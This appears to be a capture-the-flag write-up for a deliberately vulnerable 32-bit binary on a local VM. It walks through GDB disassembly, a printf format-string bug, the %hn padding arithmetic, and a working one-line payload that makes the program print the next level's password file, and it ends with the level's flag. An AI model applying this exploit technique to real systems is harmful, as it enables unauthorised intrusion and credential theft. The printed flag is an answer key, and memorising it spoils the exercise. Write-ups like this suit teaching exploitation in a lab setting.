# Level 4

## Connect to the virtual machine with SSH

Use the flag from `level3` as the `level4` password:

```bash
ssh level4@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level4@127.0.0.1:/home/user/level4/level4 ./level4/
```

The extracted binary is saved as `level4/level4`.

## Copy the GDB dump to the host

Inside the VM, connected as `level4`, open the binary with GDB:

```bash
gdb ./level4
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level4_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas n
disas p
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level4@127.0.0.1:/tmp/level4_main_dump_gdb ./level4/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble n" \
  -ex "disassemble p" \
  ./level4/level4 > ./level4/level4_main_dump_gdb
```

## Analyze the GDB dump

`main` only calls `n`:

```asm
0x080484a7 <+0>:  push   ebp
0x080484a8 <+1>:  mov    ebp,esp
0x080484aa <+3>:  and    esp,0xfffffff0
0x080484ad <+6>:  call   0x8048457 <n>
0x080484b2 <+11>: leave
0x080484b3 <+12>: ret
```

`n` reads input with `fgets`, then passes it to `p`:

```asm
0x08048471 <+26>: lea    eax,[ebp-0x208]
0x08048477 <+32>: mov    DWORD PTR [esp],eax
0x0804847a <+35>: call   0x8048350 <fgets@plt>
0x0804847f <+40>: lea    eax,[ebp-0x208]
0x08048485 <+46>: mov    DWORD PTR [esp],eax
0x08048488 <+49>: call   0x8048444 <p>
```

`p` calls `printf` directly on that input:

```asm
0x0804844a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
0x0804844d <+9>:  mov    DWORD PTR [esp],eax
0x08048450 <+12>: call   0x8048340 <printf@plt>
```

So this is a format-string vulnerability.

After `p` returns, `n` checks a global variable:

```asm
0x0804848d <+54>: mov    eax,ds:0x8049810
0x08048492 <+59>: cmp    eax,0x1025544
0x08048497 <+64>: jne    0x80484a5 <n+78>
0x08048499 <+66>: mov    DWORD PTR [esp],0x8048590
0x080484a0 <+73>: call   0x8048360 <system@plt>
```

The global variable is `m`:

```bash
objdump -t level4/level4 | grep ' m$'
```

Result:

```text
08049810 g     O .bss  00000004              m
```

So the target is:

```text
m = 0x08049810
```

The program runs this command only if `m == 0x01025544`:

```text
/bin/cat /home/user/level5/.pass
```

## Find the format-string argument index

Send a marker followed by `%x` probes:

```bash
python -c 'print "AAAA" + ".%x" * 15' | /home/user/level4/level4
```

Output:

```text
AAAA.b7ff26b0.bffffc54.b7fd0ff4.0.0.bffffc18.804848d.bffffa10.200.b7fd1ac0.b7ff37d0.41414141...
```

`41414141` is `AAAA` in hexadecimal. It appears as the 12th printed argument,
so the start of our input is reachable with `%12$...`.

## Understand the write

The goal is to change `m` from `0` to:

```text
0x01025544
```

In memory, `m` is 4 bytes:

```text
address      value we want
0x08049810   44
0x08049811   55
0x08049812   02
0x08049813   01
```

This is little endian storage. The number `0x01025544` is stored as bytes
`44 55 02 01`.

With a format-string bug, `%n` writes the number of characters already printed.
For example, if `printf` has printed 64 characters, `%n` writes the integer
`64`.

Here we need a much bigger number:

```text
0x01025544 = 16930116
```

Printing 16930116 characters would be very slow and ugly. Instead, use `%hn`.
`%hn` writes only 2 bytes instead of 4 bytes.

So we split the target value into two 2-byte writes:

```text
0x01025544
    ---- high 2 bytes: 0x0102
----     low  2 bytes: 0x5544
```

That means:

```text
write 0x0102 at m + 2
write 0x5544 at m
```

The addresses are:

```text
m + 2 = 0x08049812 -> \x12\x98\x04\x08
m     = 0x08049810 -> \x10\x98\x04\x08
```

We put those addresses at the beginning of the input:

```text
[\x12\x98\x04\x08][\x10\x98\x04\x08][format string...]
```

From the `%x` probe, the first address is the 12th `printf` argument. The next
4 bytes are the 13th argument:

```text
%12$hn writes to m + 2
%13$hn writes to m
```

Now calculate the padding precisely.

The two addresses at the start are 8 raw bytes. They are printed before the
first `%hn`, so `printf` has already printed 8 characters.

First, write the high half:

```text
target high half = 0x0102 = 258
already printed  = 8
padding needed   = 258 - 8 = 250
```

So the first part is:

```text
%250d%12$hn
```

After that `%hn`, the total printed count is `258`, and `m + 2` contains
`0x0102`.

Second, write the low half:

```text
target low half  = 0x5544 = 21828
already printed  = 258
padding needed   = 21828 - 258 = 21570
```

So the second part is:

```text
%21570d%13$hn
```

The complete payload is:

```text
[\x12\x98\x04\x08][\x10\x98\x04\x08]%250d%12$hn%21570d%13$hn
```

After both writes, memory contains:

```text
m     = 0x5544
m + 2 = 0x0102
```

Together, that makes:

```text
m = 0x01025544
```

## Exploitation

Run this in the VM:

```bash
python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d%12$hn" + "%21570d%13$hn"' | /home/user/level4/level4
```

The binary prints the next password itself because it executes:

```text
/bin/cat /home/user/level5/.pass
```

## Flag

```text
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
